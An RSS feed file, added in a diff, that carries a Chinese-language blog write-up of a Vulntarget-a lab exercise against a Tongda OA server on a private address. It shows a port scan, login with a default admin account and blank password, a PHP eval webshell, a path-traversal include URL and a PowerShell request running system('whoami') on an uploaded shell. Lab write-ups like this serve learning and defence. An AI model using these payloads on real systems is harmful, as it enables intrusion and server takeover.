@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>域环境 on 天鹅座X-1的学习笔记</title><link>https://cygnus.cafe/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/</link><description>Recent content in 域环境 on 天鹅座X-1的学习笔记</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Tue, 14 Apr 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://cygnus.cafe/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/index.xml" rel="self" type="application/rss+xml"/><item><title>Vunltarget-a 靶场 write up</title><link>https://cygnus.cafe/posts/%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B01/</link><pubDate>Tue, 14 Apr 2026 00:00:00 +0000</pubDate><guid>https://cygnus.cafe/posts/%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B01/</guid><description>&lt;p&gt;已知目标IP为192.168.1.236&lt;/p&gt;
+&lt;h1 id="一-扫描端口"&gt;一 扫描端口&lt;/h1&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -oA nmapscan/ports 192.168.1.236
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt; Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-13 21:56 EDT
+Nmap scan report for 192.168.1.236
+Host is up (0.0094s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT STATE SERVICE
+53/tcp closed domain
+80/tcp open http
+135/tcp open msrpc
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现有80端口，看看是什么：&lt;br&gt;
+发现试着这样的登陆系统：&lt;/p&gt;
+&lt;p&gt;&lt;img src="img/Pasted%20image%2020260414110757.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;使用的时通达OA系统&lt;br&gt;
+看看这个有没有什么历史知名漏洞或者弱密码（默认密码）&lt;br&gt;
+经典弱密码：用户admin，密码为空&lt;br&gt;
+使用经典弱密码成功登录&lt;/p&gt;
+&lt;p&gt;发现个人文件柜这里可以上传文件，上传文件试试：&lt;/p&gt;
+&lt;p&gt;&lt;img src="img/Pasted%20image%2020260414114314.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;上传websehll试试&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有建立功能，直接建立&lt;/p&gt;
+&lt;p&gt;尝试访问：&lt;br&gt;
+http://192.168.1.236/ispirit/interface/gateway.php?json={%22url%22:%22../../attach/file_folder/202604/1/webshell.php%22}&lt;br&gt;
+没有结果，这个即使被解析也无回显&lt;/p&gt;
+&lt;p&gt;再次创建或或者上传一个文件：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php echo &amp;#34;OK123&amp;#34;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这次如果被解析，就会返回OK123&lt;/p&gt;
+&lt;p&gt;没有返回，这个个人文件柜和公共文件柜大概率不是文件解析路径&lt;/p&gt;
+&lt;p&gt;找不到，使用工具扫描一下吧，&lt;br&gt;
+nmap：&lt;/p&gt;
+&lt;p&gt;nuclei：&lt;/p&gt;
+&lt;p&gt;没有&lt;/p&gt;
+&lt;p&gt;专门抓一个通达oa的漏洞工具&lt;/p&gt;
+&lt;p&gt;使用Iwannagetall工具检测，上传php文件：&lt;br&gt;
+使用蚁剑连接，发现总是失败&lt;/p&gt;
+&lt;p&gt;使用powershell的方法检查：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;
+PS C:\Users\86198&amp;gt; Invoke-WebRequest -Uri &amp;#34; http://192.168.1.236/upload_temp/2604/833611053.R4g1776150543405.php&amp;#34; -Method Post -Body &amp;#34;ant=system(&amp;#39;whoami&amp;#39;);&amp;#34;
+
+
+StatusCode : 200
+StatusDescription : OK
+Content : R4g1776150543405
+RawContent : HTTP/1.1 200 OK
+ Transfer-Encoding: chunked
+ Connection: keep-alive
+ Vary: Accept-Encoding
+ X-Frame-Options: SAMEORIGIN
+ Content-Type: text/html; charset=gbk
+ Date: Tue, 14 Apr 2026 07:16:08 GMT
+ Serv...
+Forms : {}
+Headers : {[Transfer-Encoding, chunked], [Connection, keep-alive], [Vary, Accept-Encoding], [X-Frame-Options, SAMEORIGIN]...}
+Images : {}
+InputFields : {}
+Links : {}
+ParsedHtml : mshtml.HTMLDocumentClass
+RawContentLength : 16
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Content : R4g1776150543405是文件名字的一部分，说明服务可能器确实解析了php文件，但是结果被拦截了，可能禁用了system()函数&lt;/p&gt;</description></item></channel></rss>
